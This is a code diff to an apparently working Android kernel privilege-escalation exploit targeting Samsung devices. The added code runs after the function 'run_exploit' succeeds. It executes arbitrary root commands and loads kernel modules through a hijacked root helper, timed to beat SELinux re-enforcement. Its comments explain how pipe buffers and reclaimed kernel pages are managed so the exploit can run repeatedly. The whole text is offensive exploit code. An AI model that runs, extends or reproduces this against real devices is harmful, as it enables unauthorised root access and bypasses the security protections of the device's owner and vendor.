@@ -213,6 +213,50 @@ int run_exploit(int argc, char **argv) {
   }
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
+    /* Release the 480 drain/reclaim pipes (~15k pipe buffers) before the
+     * keeper forks: it would otherwise inherit and pin them forever, and
+     * uid-2000's pipe-buffer quota (~16k soft) then EPERMs every future
+     * run's F_SETPIPE_SZ — exactly one green run per boot.  The skb
+     * reclaim ring (fake_fops page retention) and the shaped n/c/e pipes
+     * stay open; nothing reads the drain/reclaim pages after this point. */
+    reset_pipe_attempt();
+    /* Optional zero-gap module load: SELinux re-arms to Enforcing within
+     * minutes on Samsung (the root-helper socket becomes unreachable to
+     * shell clients), so a human Ctrl+C + insmod round-trip usually loses
+     * the race.  ROOT_HELPER_INSMOD=/path/to.ko runs insmod through the
+     * just-proven daemon right here, milliseconds after socket=1. */
+    const char *insmod_path = getenv("ROOT_HELPER_INSMOD");
+    if (insmod_path && *insmod_path) {
+      char cmd[256];
+      snprintf(cmd, sizeof(cmd), "insmod %s", insmod_path);
+      pid_t mod = SYSCHK(fork());
+      if (mod == 0) {
+        execl(ROOT_UMH_PATH, ROOT_UMH_PATH, "-c", cmd, (char *)NULL);
+        _exit(127);
+      }
+      int st = 0;
+      while (waitpid(mod, &st, 0) < 0 && errno == EINTR) {
+      }
+      pr_success("root-helper insmod pid=%d status=%d cmd=%s\n",
+                 mod, WIFEXITED(st) ? WEXITSTATUS(st) : st, cmd);
+    }
+    /* Arbitrary zero-gap root command (same permissive window as above).
+     * E.g. ROOT_HELPER_CMD="/data/local/tmp/ksud late-load --allow-shell"
+     * runs KernelSU-Next's official late-load stage (ko + userspace setup)
+     * before Samsung re-arms SELinux and the helper socket goes dark. */
+    const char *helper_cmd = getenv("ROOT_HELPER_CMD");
+    if (helper_cmd && *helper_cmd) {
+      pid_t cc = SYSCHK(fork());
+      if (cc == 0) {
+        execl(ROOT_UMH_PATH, ROOT_UMH_PATH, "-c", helper_cmd, (char *)NULL);
+        _exit(127);
+      }
+      int cst = 0;
+      while (waitpid(cc, &cst, 0) < 0 && errno == EINTR) {
+      }
+      pr_success("root-helper cmd pid=%d status=%d cmd=%s\n",
+                 cc, WIFEXITED(cst) ? WEXITSTATUS(cst) : cst, helper_cmd);
+    }
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
